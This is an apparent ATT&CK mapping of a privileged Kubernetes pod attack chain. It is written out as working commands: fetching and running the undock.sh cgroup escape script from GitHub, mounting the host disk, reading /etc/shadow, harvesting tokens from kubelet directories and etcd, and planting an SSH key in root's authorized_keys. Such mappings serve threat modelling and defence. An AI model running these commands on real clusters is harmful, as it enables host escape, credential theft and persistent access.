# MITRE ATT&CK Mapping: Priv Pod

## Attack Flow

```
Initial Access → Execution → Privilege Escalation → Credential Access → 
Discovery → Lateral Movement → Collection → Persistence
```

---

## MITRE ATT&CK Techniques

### 1. Initial Access

#### T1078 - Valid Accounts
**Behavior:** Attacker uses compromised Kubernetes credentials

**Procedures:**
```bash
kubectl apply -f priv-exec-pod.yaml
```

---

### 2. Execution

#### T1609 - Container Administration Command
**Behavior:** Execute commands in container via kubectl exec

**Procedures:**
```bash
kubectl exec -it priv-exec-pod -- bash
```

#### T1059.004 - Command and Scripting Interpreter: Unix Shell
**Behavior:** Execute bash commands and scripts for exploitation

**Procedures:**
```bash
# Mount host filesystem
mkdir /host
mount /dev/sda1 /host/

# Download and run exploitation scripts
curl https://raw.githubusercontent.com/FelixWilhelm/public/master/exploits/docker-undock/undock.sh > undock.sh
./undock.sh "whoami"
```

---

### 3. Privilege Escalation

#### T1611 - Escape to Host
**Behavior:** Two paths to escape container - manual mount or cgroup exploit

**Path 1 - Manual Mount:**
```bash
# Check storage devices
fdisk -l

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host/

# Limited access to host files
cd /host
```

**Path 2 - Cgroup Exploit (undock.sh):**
```bash
# Download Felix Wilhelm's undock.sh
curl https://raw.githubusercontent.com/FelixWilhelm/public/master/exploits/docker-undock/undock.sh > undock.sh
chmod +x undock.sh

# Execute commands on host (non-interactive)
./undock.sh "whoami"
./undock.sh "cat /etc/shadow"
```

**Path 3 - Interactive Shell (Edwards & Freeman version):**
```bash
# Upgrade to interactive reverse shell on host
# Uses cgroup release_agent exploit
```

**Pod Configuration:**
```yaml
spec:
  containers:
  - securityContext:
      privileged: true
```

---

### 4. Credential Access

#### T1552.001 - Unsecured Credentials: Credentials In Files
**Behavior:** Access credentials via mounted filesystem or post-escape

**Service Account Tokens (after escape):**
```bash
find /var/lib/kubelet/pods/ -name token
```

**Kubeconfig Files:**
```bash
find /host -name kubeconfig
find /host -name .kube
grep -R "current-context" /host/home/
grep -R "current-context" /host/root/
```

**etcd Secrets (Control-Plane Node):**
```bash
strings /host/var/lib/etcd/member/snap/db | grep eyJhbGciOiJ
```

#### T1555 - Credentials from Password Stores
**Behavior:** Extract credentials from etcd

**Procedures:**
```bash
strings /host/var/lib/etcd/member/snap/db
```

---

### 5. Discovery

#### T1082 - System Information Discovery
**Behavior:** Discover storage devices and system info

**Procedures:**
```bash
fdisk -l
ps -ef | grep etcd
```

#### T1083 - File and Directory Discovery
**Behavior:** Search for sensitive files via mounted filesystem

**Procedures:**
```bash
find /host -name kubeconfig
find /host -name .kube
grep -R "current-context" /host/
```

---

### 6. Lateral Movement

#### T1021.007 - Remote Services: Cloud Services
**Behavior:** Use stolen credentials to access Kubernetes API

**Procedures:**
```bash
kubectl --token=$STOLEN_TOKEN get secrets -n kube-system
```

---

### 7. Collection

#### T1005 - Data from Local System
**Behavior:** Collect data from mounted host filesystem

**Procedures:**
```bash
cat /host/etc/shadow
strings /host/var/lib/etcd/member/snap/db
```

---

### 8. Persistence

#### T1098 - Account Manipulation
**Behavior:** Add SSH keys via mounted filesystem

**Procedures:**
```bash
echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
```

---

## Technique Summary

| Tactic | Technique ID | Technique Name |
|--------|-------------|----------------|
| Initial Access | T1078 | Valid Accounts |
| Execution | T1609 | Container Administration Command |
| Execution | T1059.004 | Unix Shell |
| Privilege Escalation | T1611 | Escape to Host (mount or cgroup exploit) |
| Credential Access | T1552.001 | Credentials In Files |
| Credential Access | T1555 | Credentials from Password Stores |
| Discovery | T1082 | System Information Discovery |
| Discovery | T1083 | File and Directory Discovery |
| Lateral Movement | T1021.007 | Cloud Services |
| Collection | T1005 | Data from Local System |
| Persistence | T1098 | Account Manipulation |

**Total: 11 Techniques across 7 Tactics**

**Key Features:**
- Two escape paths: manual mount (limited) or cgroup exploit (full RCE)
- Uses undock.sh for cgroup release_agent exploitation
- No hostPID so cannot use nsenter
